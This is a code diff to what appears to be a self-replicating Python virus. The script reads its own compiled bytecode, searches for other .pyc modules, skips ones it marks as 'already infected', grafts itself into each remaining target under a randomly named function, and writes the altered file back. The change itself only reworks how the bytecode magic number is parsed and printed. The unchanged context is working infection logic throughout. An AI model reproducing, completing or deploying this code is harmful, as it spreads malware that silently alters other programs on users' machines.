@@ -17,10 +17,6 @@ def main_wrapper():
 
     py_version = "".join([str(a) for a in sys.version_info[:2]])
 
-    # I'm picky about hex representation, what can I say? Magic is truncated because the last two bytes are always \r\n.
-    # Note that the magic is meant to be interpreted as a LE uint, but there's not much point here
-    magic_hex = lambda x: ''.join(["%02X" % a for a in x])[:4]
-
     # Find our file, compile it if it's not already compiled
     this_path = os.path.abspath(__file__)
     compiled_file_name = this_path
@@ -35,7 +31,9 @@ def main_wrapper():
 
     # Load the compiled file, pull the contents out
     with open(compiled_file_name, "rb") as f:
-        this_magic, this_moddate, this_source_size = f.read(4), f.read(4), f.read(4)
+        this_magic = struct.unpack("<H", f.read(2))[0]
+        f.read(2)
+        this_moddate, this_source_size = f.read(4), f.read(4)
         this_module = marshal.load(f)
 
     # Leaving suspicious files everywhere is impolite
@@ -59,11 +57,13 @@ def main_wrapper():
                     continue
 
                 with open(target_file, "rb") as f:
-                    magic, moddate, source_size = f.read(4), f.read(4), f.read(4)
+                    magic = struct.unpack("<H", f.read(2))[0]
+                    f.read(2)
+                    moddate, source_size = f.read(4), f.read(4)
                     module = marshal.load(f)
 
                 if magic!=this_magic:
-                    print("    Target module mismatch ({} v {})".format(magic_hex(magic), magic_hex(this_magic)))
+                    print("    Target module mismatch ({} v {})".format(magic, this_magic))
                     continue
                 # Check for LOAD_CONST/LOAD_CONST/MAKE_FUNCTION/CALL_FUNCTION. Let's use it as our signature!
                 elif int(py_version)<36 and module.co_code[0]==0x64 and module.co_code[3]==0x64 and module.co_code[6]==0x84 and module.co_code[9]==0x83:
@@ -73,7 +73,7 @@ def main_wrapper():
                     print("    Module likely already infected")
                     continue
                 else:
-                    print("    Infecting module (v {})".format(magic_hex(magic)))
+                    print("    Infecting module (v {})".format(magic))
 
                 new_method_name = "".join([random.choice(string.ascii_lowercase) for x in range(255)])
 
@@ -113,7 +113,8 @@ def main_wrapper():
                     module.co_cellvars)
 
                 with open(target_file, "wb") as f:
-                    f.write(magic)
+                    f.write(struct.pack("<H", magic))
+                    f.write(b"\r\n")
                     f.write(moddate)
                     f.write(source_size)
                     marshal.dump(module_out, f)
